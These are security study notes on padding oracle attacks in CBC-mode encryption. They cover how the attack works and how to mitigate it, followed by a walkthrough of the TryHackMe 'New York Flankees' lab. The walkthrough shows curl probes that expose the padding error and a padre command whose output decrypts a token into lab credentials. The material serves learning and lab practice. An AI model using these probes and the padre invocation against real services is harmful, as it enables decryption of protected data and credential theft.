
# Overview
>[!INFO]
>- Padding oracle attacks are a type of cryptographic attack that exploits the way certain cryptographic systems handle padding in block ciphers. These attacks target systems that use symmetric-key cryptography and block ciphers by manipulating the padding used in encrypted messages, allowing attackers to gain information about the plaintext and potentially decrypt it without needing to break the encryption key.
>
>**Must Know :** 
>1. Padding oracle attacks take advantage of error messages or timing differences that occur when the padding of a decrypted message is validated, allowing attackers to deduce information about the plain-text.
>2. These attacks are particularly effective against systems that use Cipher Block Chaining (CBC) mode, where incorrect padding leads to different error responses from the server.
>3. To mitigate padding oracle attacks, developers can implement constant-time checks or avoid revealing specific error messages that can leak information about the decryption process.
>4. Padding oracle attacks can potentially recover entire plaintext messages by making multiple requests to the server and analyzing its responses.
>5. Cryptographic protocols that fail to properly handle padding validation are at significant risk of being vulnerable to these types of attacks.
>- **POODLE** (Padding Oracle on Downgraded Legacy Encryption) is an example of a padding oracle attack (downgrading from TLS 1.0 to SSL 3.0) to decrypt communications between a server and a user.

## How does it work ?
- **Block Encryption and Padding**: To encrypt data, block cipher algorithms like AES or DES are often used. These algorithms encrypt data in fixed-size blocks (e.g., 16 bytes for AES). If the last block of data is not large enough, extra bytes are added to "pad" it to the required size. This process is known as "padding."
- **Decryption and Padding Verification**: When an application receives encrypted data, it first decrypts the data and then checks if the padding is correct (i.e., if the added padding bytes conform to a specific format).
- **Padding Oracle**: In a padding oracle attack, an attacker can send multiple modified versions of the encrypted data to the application and observe its response. If the application returns a specific error or message when the padding is incorrect, the attacker can infer information about the content of the encrypted data.
- **The Attack**: By gradually modifying the encrypted data and observing the application's responses, the attacker can deduce the contents of the original message. The attacker uses the application as an "oracle" that indicates whether their padding is correct or not. Over time, they can reconstruct the plaintext data without ever having access to the encryption key.
- **Recommendation**: Avoid using block cipher algorithms; instead, prefer authenticated encryption methods like AES-GCM or AES-CCM.

# Labs
https://github.com/flast101/padding-oracle-attack-explained

## New York Flankees - THM
https://tryhackme.com/r/room/thenewyorkflankees

### Encrypted payload analysis
```javascript
function stefanTest1002() {
    var xhr = new XMLHttpRequest();
    var url = "http://localhost/api/debug";
    // Submit the AES/CBC/PKCS payload to get an auth token
    // TODO: Finish logic to return token
    xhr.open("GET", url + "/39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4", true);

    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            console.log("Response: ", xhr.responseText);
        } else {
            console.error("Failed to send request.");
        }
    };
    xhr.send();
}
```

- Making the request :
```bash
curl 'http://10.10.99.229:8080/api/debug/39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4'
Custom authentication success
```

- Changing 1 bit : 
```bash
curl 'http://10.10.99.229:8080/api/debug/39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF5'
Decryption error
```

>So there's a padding error. We can perform a padding oracle attack to decrypt the payload !

### Decrypt the payload
#### Tool : padre
https://github.com/glebarez/padre

```bash
❯ padre -u 'http://10.10.134.72:8080/api/debug/$' -e lhex -p 64 '39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4'                                                                                                                                                                    
[i] padre is on duty
[i] using concurrency (http connections): 64
[+] successfully detected padding oracle
[+] detected block length: 16
[!] mode: decrypt
[1/1] stefan1197:ebb2B76@62#f??7cA6B76@6!@62#f6dacd2599\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f


# -u : url
# -e : encoding applied to binary data : here lowercase hex
# -p : number of parallel HTTP connections established to target server
```